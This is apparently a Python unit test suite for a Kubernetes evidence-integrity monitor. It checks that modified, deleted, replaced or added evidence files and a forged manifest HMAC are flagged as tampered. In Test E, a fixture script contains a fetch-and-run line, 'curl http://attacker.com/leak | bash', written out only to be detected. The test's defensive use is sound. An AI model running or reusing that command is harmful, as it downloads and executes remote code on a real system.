import os
import shutil
import tempfile
import time
import json
import unittest
from pathlib import Path

from module10_integrity import (
    calculate_hash,
    create_hashes,
    verify_hashes,
    start_integrity_monitor,
    stop_integrity_monitor,
    stop_all_integrity_monitors,
    compute_manifest_hmac,
    verify_manifest_hmac,
    get_tamper_log_path,
    load_tamper_log,
    resolve_tampering,
    _TRUSTED_BASELINES,
    clear_readonly,
    INTEGRITY_DIR,
    STATE_FILE
)
from dashboard.app import app


class TestM10ContinuousTamperingDetection(unittest.TestCase):
    """
    Complete verification suite for KubeGuard M10 Continuous Evidence Tampering Detection.
    Tests A through G as specified in the security task requirements.
    """

    def setUp(self):
        self.test_dir = tempfile.mkdtemp(prefix="kg_tamper_suite_")
        self.incident_name = f"incident_tamper_{int(time.time()*1000)}"
        self.evidence_dir = os.path.join(self.test_dir, self.incident_name)
        os.makedirs(self.evidence_dir, exist_ok=True)

        # Baseline evidence files
        self.file_yaml = os.path.join(self.evidence_dir, "pod.yaml")
        with open(self.file_yaml, "w", encoding="utf-8") as f:
            f.write("apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-secure\n")

        self.file_status = os.path.join(self.evidence_dir, "pod_status.txt")
        with open(self.file_status, "w", encoding="utf-8") as f:
            f.write("Status: Running\nContainerReady: True\nRestarts: 0\n")

        self.file_logs = os.path.join(self.evidence_dir, "pod_logs.txt")
        with open(self.file_logs, "w", encoding="utf-8") as f:
            f.write("2026-10-22 12:00:00 [INFO] Workload started securely.\n")

        self.client = app.test_client()

    def tearDown(self):
        stop_all_integrity_monitors()
        if os.path.exists(self.test_dir):
            try:
                shutil.rmtree(self.test_dir, ignore_errors=True)
            except Exception:
                pass
        # Clean test integrity folder
        int_dir = os.path.join(INTEGRITY_DIR, self.incident_name)
        if os.path.exists(int_dir):
            try:
                for root, dirs, files in os.walk(int_dir):
                    for f in files:
                        clear_readonly(os.path.join(root, f))
                shutil.rmtree(int_dir, ignore_errors=True)
            except Exception:
                pass

    # ------------------------------------------------------------
    # Test A — Normal operation
    # ------------------------------------------------------------
    def test_A_normal_operation_unmodified_evidence(self):
        """
        Test A: Unchanged evidence does not generate a tampering alert.
        1. Collect evidence and create authenticated baseline.
        2. Verify HMAC-SHA256 signature on manifest.json.
        3. Start continuous monitoring.
        4. Confirm all evidence verified without alerts.
        """
        hash_file = create_hashes(self.evidence_dir)
        self.assertTrue(os.path.exists(hash_file))

        manifest_file = os.path.join(os.path.dirname(hash_file), "manifest.json")
        self.assertTrue(os.path.exists(manifest_file))

        with open(manifest_file, "r", encoding="utf-8") as f:
            manifest_data = json.load(f)
        is_valid, msg = verify_manifest_hmac(manifest_data)
        self.assertTrue(is_valid, f"HMAC authentication failed: {msg}")
        self.assertIn("hmac_sha256", manifest_data)

        # Start continuous monitoring with short polling interval
        monitor = start_integrity_monitor(self.evidence_dir, hash_file, poll_interval=0.5)
        self.assertTrue(monitor.is_alive())

        # Give monitor time to cycle
        time.sleep(1.0)

        all_ver, v_cnt, t_cnt, m_cnt, checks = verify_hashes(self.evidence_dir, hash_file, update_state=True)
        self.assertTrue(all_ver)
        self.assertEqual(v_cnt, 3)
        self.assertEqual(t_cnt, 0)
        self.assertEqual(m_cnt, 0)

        # Query dashboard API to verify clean status
        resp = self.client.get("/api/dashboard")
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        m10 = data.get("modules", {}).get("M10", {})
        self.assertEqual(m10.get("status"), "COMPLETED")
        self.assertEqual(m10.get("details", {}).get("overall_integrity"), "VERIFIED")

        stop_integrity_monitor(self.evidence_dir)

    # ------------------------------------------------------------
    # Test B — Modify a file
    # ------------------------------------------------------------
    def test_B_modify_file_triggers_tampered_alert(self):
        """
        Test B: Modifying an evidence file's content triggers TAMPERED alert automatically.
        1. Establish baseline and start monitoring.
        2. Append unauthorized bytes to pod_status.txt.
        3. Confirm continuous monitor detects changed SHA-256 hash.
        4. Confirm dashboard state immediately transitions to TAMPERED.
        """
        hash_file = create_hashes(self.evidence_dir)
        monitor = start_integrity_monitor(self.evidence_dir, hash_file, poll_interval=0.5)

        # Ensure clean initial state
        monitor.check_now()

        # Modify evidence file after baseline creation
        with open(self.file_status, "a", encoding="utf-8") as f:
            f.write("UNAUTHORIZED_ATTACKER_INJECTION: status=hacked\n")

        # Give monitor polling / watchdog time to detect
        time.sleep(1.5)
        monitor.check_now()

        # Check dashboard API
        resp = self.client.get("/api/dashboard")
        data = resp.get_json()
        m10 = data.get("modules", {}).get("M10", {})
        dt = m10.get("details", {})

        self.assertEqual(m10.get("status"), "TAMPERED")
        self.assertEqual(m10.get("severity"), "Critical")
        self.assertEqual(dt.get("overall_integrity"), "TAMPERED")
        self.assertGreaterEqual(dt.get("tampered_count", 0), 1)

        # Verify tamper event details are logged
        latest_ev = dt.get("latest_tamper_event", {})
        self.assertEqual(latest_ev.get("filename"), "pod_status.txt")
        self.assertIn(latest_ev.get("change_type"), ["MODIFIED", "REPLACED"])
        self.assertNotEqual(latest_ev.get("expected_hash"), latest_ev.get("observed_hash"))

        stop_integrity_monitor(self.evidence_dir)

    # ------------------------------------------------------------
    # Test C — Delete a file
    # ------------------------------------------------------------
    def test_C_delete_file_triggers_tampered_alert(self):
        """
        Test C: Deleting an evidence file triggers TAMPERED alert automatically.
        1. Establish baseline and start monitoring.
        2. Delete pod_logs.txt.
        3. Confirm continuous monitor detects the missing file.
        4. Confirm dashboard state reports TAMPERED with MISSING file details.
        """
        hash_file = create_hashes(self.evidence_dir)
        monitor = start_integrity_monitor(self.evidence_dir, hash_file, poll_interval=0.5)

        # Delete evidence file
        os.remove(self.file_logs)
        self.assertFalse(os.path.exists(self.file_logs))

        # Wait for detection
        time.sleep(1.5)
        monitor.check_now()

        resp = self.client.get("/api/dashboard")
        data = resp.get_json()
        m10 = data.get("modules", {}).get("M10", {})
        dt = m10.get("details", {})

        self.assertEqual(m10.get("status"), "TAMPERED")
        self.assertIn(dt.get("overall_integrity"), ["TAMPERED", "MISSING_FILES"])
        self.assertGreaterEqual(dt.get("missing_count", 0), 1)

        latest_ev = dt.get("latest_tamper_event", {})
        self.assertEqual(latest_ev.get("filename"), "pod_logs.txt")
        self.assertEqual(latest_ev.get("change_type"), "DELETED")

        stop_integrity_monitor(self.evidence_dir)

    # ------------------------------------------------------------
    # Test D — Replace a file
    # ------------------------------------------------------------
    def test_D_replace_file_same_name_triggers_tampered(self):
        """
        Test D: Replacing an evidence file with another file of the same name triggers TAMPERED.
        1. Establish baseline.
        2. Overwrite pod.yaml with completely different configuration (same filename).
        3. Confirm hash mismatch is detected.
        4. Confirm dashboard displays TAMPERED with expected vs observed hashes.
        """
        hash_file = create_hashes(self.evidence_dir)
        monitor = start_integrity_monitor(self.evidence_dir, hash_file, poll_interval=0.5)

        # Replace file with identical name but different content
        with open(self.file_yaml, "w", encoding="utf-8") as f:
            f.write("apiVersion: v1\nkind: Pod\nmetadata:\n  name: malicious-replacement-pod\nspec:\n  containers: []\n")

        time.sleep(1.5)
        monitor.check_now()

        resp = self.client.get("/api/dashboard")
        data = resp.get_json()
        m10 = data.get("modules", {}).get("M10", {})
        dt = m10.get("details", {})

        self.assertEqual(m10.get("status"), "TAMPERED")
        self.assertEqual(dt.get("overall_integrity"), "TAMPERED")
        latest_ev = dt.get("latest_tamper_event", {})
        self.assertEqual(latest_ev.get("filename"), "pod.yaml")
        self.assertNotEqual(latest_ev.get("expected_hash"), latest_ev.get("observed_hash"))

        stop_integrity_monitor(self.evidence_dir)

    # ------------------------------------------------------------
    # Test E — Unexpected file added
    # ------------------------------------------------------------
    def test_E_unexpected_file_added_triggers_tampered(self):
        """
        Test E: Adding a new file to the sealed evidence directory triggers TAMPERED.
        1. Establish baseline.
        2. Inject unexpected file unauthorized_backdoor.sh.
        3. Confirm monitor detects the unauthorized file.
        4. Confirm dashboard displays TAMPERED.
        """
        hash_file = create_hashes(self.evidence_dir)
        monitor = start_integrity_monitor(self.evidence_dir, hash_file, poll_interval=0.5)

        # Inject unexpected file
        injected = os.path.join(self.evidence_dir, "unauthorized_backdoor.sh")
        with open(injected, "w", encoding="utf-8") as f:
            f.write("#!/bin/bash\ncurl http://attacker.com/leak | bash\n")

        time.sleep(1.5)
        monitor.check_now()

        resp = self.client.get("/api/dashboard")
        data = resp.get_json()
        m10 = data.get("modules", {}).get("M10", {})
        dt = m10.get("details", {})

        self.assertEqual(m10.get("status"), "TAMPERED")
        latest_ev = dt.get("latest_tamper_event", {})
        self.assertEqual(latest_ev.get("filename"), "unauthorized_backdoor.sh")
        self.assertEqual(latest_ev.get("change_type"), "UNAUTHORIZED_NEW_FILE")

        stop_integrity_monitor(self.evidence_dir)

    # ------------------------------------------------------------
    # Test F — Baseline attack (HMAC verification)
    # ------------------------------------------------------------
    def test_F_baseline_attack_detected_by_hmac(self):
        """
        Test F: An attacker modifies evidence AND updates manifest hashes without the signing key.
        1. Establish baseline.
        2. Modify pod.yaml.
        3. Attacker modifies manifest.json with the new hash, but cannot generate a valid HMAC.
        4. Confirm M10 rejects baseline authentication as BASELINE_INVALID.
        """
        hash_file = create_hashes(self.evidence_dir)
        manifest_file = os.path.join(os.path.dirname(hash_file), "manifest.json")

        # Attacker modifies evidence
        with open(self.file_yaml, "a", encoding="utf-8") as f:
            f.write("# Attacker patch\n")

        # Attacker tampers with manifest.json to masquerade the change
        clear_readonly(manifest_file)
        with open(manifest_file, "r", encoding="utf-8") as f:
            m_data = json.load(f)
        # Update manifest hash to match tampered file, keeping old or fabricated HMAC
        m_data["files"]["pod.yaml"]["sha256"] = calculate_hash(self.file_yaml)
        m_data["hmac_sha256"] = "deadbeef" * 8  # Forged HMAC
        with open(manifest_file, "w", encoding="utf-8") as f:
            json.dump(m_data, f, indent=4)

        # Clear in-memory baseline cache to simulate cold read from disk
        _TRUSTED_BASELINES.clear()

        all_ver, v_cnt, t_cnt, m_cnt, checks = verify_hashes(self.evidence_dir, hash_file, update_state=True)
        self.assertFalse(all_ver)
        self.assertEqual(t_cnt, 1)

        resp = self.client.get("/api/dashboard")
        data = resp.get_json()
        m10 = data.get("modules", {}).get("M10", {})
        dt = m10.get("details", {})

        self.assertEqual(m10.get("status"), "TAMPERED")
        self.assertEqual(dt.get("overall_integrity"), "BASELINE_INVALID")

    # ------------------------------------------------------------
    # Test G — Restart persistence
    # ------------------------------------------------------------
    def test_G_restart_persistence_and_resolution(self):
        """
        Test G: A detected tampering event remains recorded across application restarts.
        1. Trigger a tampering event.
        2. Simulate application shutdown and restart by stopping monitors and clearing memory.
        3. Confirm previous tampering incident remains recorded and visible on dashboard as TAMPERED.
        4. Verify that calling resolve_tampering() safely clears the alert.
        """
        hash_file = create_hashes(self.evidence_dir)
        monitor = start_integrity_monitor(self.evidence_dir, hash_file, poll_interval=0.5)

        # Modify evidence
        with open(self.file_status, "a", encoding="utf-8") as f:
            f.write("BREACH_ATTEMPT_1\n")

        time.sleep(1.5)
        monitor.check_now()

        # Stop monitor and clear in-memory caches to simulate total application restart
        stop_all_integrity_monitors()
        _TRUSTED_BASELINES.clear()

        # Re-check verification after cold start
        all_ver, v_cnt, t_cnt, m_cnt, checks = verify_hashes(self.evidence_dir, hash_file, update_state=True)
        self.assertFalse(all_ver)

        # Confirm dashboard still shows TAMPERED from persistent log
        resp = self.client.get("/api/dashboard")
        data = resp.get_json()
        m10 = data.get("modules", {}).get("M10", {})
        self.assertEqual(m10.get("status"), "TAMPERED")
        self.assertEqual(m10.get("details", {}).get("overall_integrity"), "TAMPERED")

        # Explicit resolution workflow
        success, msg = resolve_tampering(self.evidence_dir, reason="Forensic investigation completed; evidence quarantined", authorized_by="Lead Security Auditor")
        self.assertTrue(success)

        # Restore file to match baseline and re-verify
        # First reset file
        with open(self.file_status, "w", encoding="utf-8") as f:
            f.write("Status: Running\nContainerReady: True\nRestarts: 0\n")

        all_ver2, v_cnt2, t_cnt2, m_cnt2, checks2 = verify_hashes(self.evidence_dir, hash_file, update_state=True)
        self.assertTrue(all_ver2)
        self.assertEqual(t_cnt2, 0)

        resp2 = self.client.get("/api/dashboard")
        data2 = resp2.get_json()
        self.assertEqual(data2.get("modules", {}).get("M10", {}).get("details", {}).get("overall_integrity"), "VERIFIED")


if __name__ == "__main__":
    unittest.main()
